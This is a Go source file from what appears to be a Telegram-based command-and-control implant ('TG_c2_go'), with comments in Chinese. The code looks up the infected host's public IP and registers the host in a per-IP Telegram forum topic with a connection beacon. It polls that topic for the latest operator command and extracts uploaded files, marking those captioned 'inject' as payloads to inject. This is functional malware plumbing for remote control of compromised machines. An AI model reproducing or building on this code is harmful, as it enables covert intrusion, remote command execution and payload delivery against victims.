package core

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"

	"TG_c2_go/config"
	"TG_c2_go/telegram"
)

// TopicManager 管理Telegram主题相关功能
type TopicManager struct {
	client *telegram.TelegramClient
}

// NewTopicManager 创建新的主题管理器
func NewTopicManager() *TopicManager {
	return &TopicManager{
		client: telegram.NewTelegramClient(),
	}
}

// GetPublicIP 获取公网IP地址
func (tm *TopicManager) GetPublicIP() (string, error) {
	resp, err := http.Get("http://ipinfo.io/ip")
	if err != nil {
		return "", fmt.Errorf("获取IP地址失败: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("获取IP地址失败: HTTP状态码 %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("读取IP响应失败: %v", err)
	}

	ip := strings.TrimSpace(string(body))
	if ip == "" {
		return "", fmt.Errorf("获取到的IP地址为空")
	}

	return ip, nil
}

// FindExistingTopic 在现有消息中查找包含指定IP的主题ID
func (tm *TopicManager) FindExistingTopic(updates []byte, targetIP string) (int64, error) {
	var updateResponse struct {
		Result []struct {
			Message struct {
				ReplyToMessage *struct {
					ForumTopicCreated *struct {
						Name string `json:"name"`
					} `json:"forum_topic_created"`
				} `json:"reply_to_message"`
				MessageThreadID int64 `json:"message_thread_id"`
			} `json:"message"`
		} `json:"result"`
	}

	err := json.Unmarshal(updates, &updateResponse)
	if err != nil {
		return 0, fmt.Errorf("解析更新JSON失败: %v", err)
	}

	// 从后往前查找最新的匹配主题
	for i := len(updateResponse.Result) - 1; i >= 0; i-- {
		item := updateResponse.Result[i]
		if item.Message.ReplyToMessage != nil &&
			item.Message.ReplyToMessage.ForumTopicCreated != nil {
			topicName := item.Message.ReplyToMessage.ForumTopicCreated.Name
			if strings.Contains(topicName, targetIP) {
				return item.Message.MessageThreadID, nil
			}
		}
	}

	return 0, fmt.Errorf("未找到包含IP %s的主题", targetIP)
}

// TestTopicAvailability 测试主题是否可用
func (tm *TopicManager) TestTopicAvailability(threadID int64, ip string) bool {
	config.SetMessageThreadID(threadID)

	err := tm.client.SendMessage(fmt.Sprintf("IP: %s已连接", ip))
	if err != nil {
		fmt.Printf("主题不可用: %v\\n", err)
		config.SetMessageThreadID(0)
		return false
	}

	fmt.Println("主题可用")
	return true
}

// InitializeTopic 初始化或创建Telegram主题
func (tm *TopicManager) InitializeTopic() error {
	// 获取公网IP
	fmt.Println("正在获取公网IP地址...")
	ip, err := tm.GetPublicIP()
	if err != nil {
		return fmt.Errorf("获取公网IP失败: %v", err)
	}

	fmt.Printf("公网IP: %s\\n", ip)

	// 获取Telegram更新
	fmt.Println("正在获取Telegram更新...")
	updates, err := tm.client.GetUpdates(0)
	if err != nil {
		return fmt.Errorf("获取Telegram更新失败: %v", err)
	}

	fmt.Printf("已获取Telegram更新，数据长度: %d 字节\\n", len(updates))

	// 检查是否存在包含当前IP的主题
	if strings.Contains(string(updates), ip) {
		fmt.Println("在历史消息中发现IP地址，尝试查找现有主题...")

		threadID, err := tm.FindExistingTopic(updates, ip)
		if err != nil {
			fmt.Printf("查找现有主题失败: %v\\n", err)
		} else if threadID != 0 {
			fmt.Printf("找到现有主题ID: %d\\n", threadID)

			// 测试主题是否可用
			fmt.Println("测试现有主题是否可用...")
			if tm.TestTopicAvailability(threadID, ip) {
				fmt.Println("现有主题可用，使用现有主题")
				return nil
			}
			fmt.Println("现有主题不可用，将创建新主题")
		}
	} else {
		fmt.Println("历史消息中未发现当前IP地址")
	}

	// 如果没有找到可用的主题，创建新主题
	fmt.Println("正在创建新主题...")

	topicName := fmt.Sprintf("IP: %s", ip)
	threadID, err := tm.client.CreateForumTopic(topicName)
	if err != nil {
		return fmt.Errorf("创建主题失败: %v", err)
	}

	config.SetMessageThreadID(threadID)
	fmt.Printf("成功创建新主题，ID: %d\\n", threadID)

	return nil
}

// ExtractLastCommandFromTopic 从主题中提取最后一条命令
func (tm *TopicManager) ExtractLastCommandFromTopic(updates []byte, threadID int64) (int64, string, error) {
	var updateResponse struct {
		Result []struct {
			UpdateID int64 `json:"update_id"`
			Message  struct {
				IsTopicMessage  bool   `json:"is_topic_message"`
				MessageThreadID int64  `json:"message_thread_id"`
				Text            string `json:"text"`
			} `json:"message"`
		} `json:"result"`
	}

	err := json.Unmarshal(updates, &updateResponse)
	if err != nil {
		return 0, "", fmt.Errorf("解析更新JSON失败: %v", err)
	}

	// 从后往前遍历查找最新命令
	for i := len(updateResponse.Result) - 1; i >= 0; i-- {
		item := updateResponse.Result[i]

		if item.Message.IsTopicMessage &&
			item.Message.MessageThreadID == threadID &&
			item.Message.Text != "" {
			return item.UpdateID, item.Message.Text, nil
		}
	}

	return 0, "", fmt.Errorf("未找到符合条件的命令")
}

// ExtractFileIDFromTopic 从主题中提取文件ID和类型
func (tm *TopicManager) ExtractFileIDFromTopic(updates []byte, threadID int64) (string, int, error) {
	var updateResponse struct {
		Result []struct {
			Message struct {
				IsTopicMessage  bool  `json:"is_topic_message"`
				MessageThreadID int64 `json:"message_thread_id"`
				Document        *struct {
					FileID string `json:"file_id"`
				} `json:"document"`
				Caption string `json:"caption"`
			} `json:"message"`
		} `json:"result"`
	}

	err := json.Unmarshal(updates, &updateResponse)
	if err != nil {
		return "", 0, fmt.Errorf("解析更新JSON失败: %v", err)
	}

	// 从后往前遍历查找最新文件
	for i := len(updateResponse.Result) - 1; i >= 0; i-- {
		item := updateResponse.Result[i]

		if item.Message.IsTopicMessage &&
			item.Message.MessageThreadID == threadID &&
			item.Message.Document != nil {

			fileID := item.Message.Document.FileID

			// 检查是否是inject文件
			if strings.EqualFold(item.Message.Caption, "inject") {
				return fileID, 0, nil // 0表示inject文件
			}

			return fileID, 1, nil // 1表示普通文件
		}
	}

	return "", 0, fmt.Errorf("未找到符合条件的文件")
}
